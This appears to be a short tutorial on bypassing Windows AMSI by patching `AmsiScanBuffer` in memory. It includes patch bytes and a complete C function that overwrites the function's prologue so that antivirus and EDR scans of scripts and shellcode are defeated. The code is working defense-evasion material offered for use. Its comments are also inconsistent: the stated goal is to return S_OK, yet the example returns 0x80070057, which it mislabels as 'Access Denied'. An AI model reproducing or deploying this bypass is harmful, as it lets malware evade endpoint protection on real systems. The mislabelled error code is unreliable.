## **Target of the AMSI Patch: `AmsiScanBuffer`**

This function, found in `amsi.dll`, is the one that:

1. Receives your script or shellcode (in plaintext, decrypted at runtime),

2. Sends it to the AV (Defender, EDR),

3. Gets a response (clean / malware),

4. May block or allow execution.

Patching `AmsiScanBuffer` = making it believe **everything is clean**, or **preventing the scan entirely**.

## Objective of the AMSI Patch

**Neutralize `AmsiScanBuffer`** to:

* Always return `S_OK` (i.e., “all good”)
  **OR**
* Return immediately without doing anything

## Classic method: overwrite the function prologue with `mov eax, 0 ; ret`

The goal is to transform `AmsiScanBuffer` into:

```asm
mov eax, 0x0       ; return code = S_OK
ret
```

C payload:

```C
BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
```

## SIMPLE EXAMPLE:

```C
#include <windows.h>
#include <stdio.h>

void PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    void* amsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!amsiScanBuffer) return;

    DWORD oldProtect;
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057 ; ret (Access Denied)

    VirtualProtect(amsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(amsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(amsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
}
```
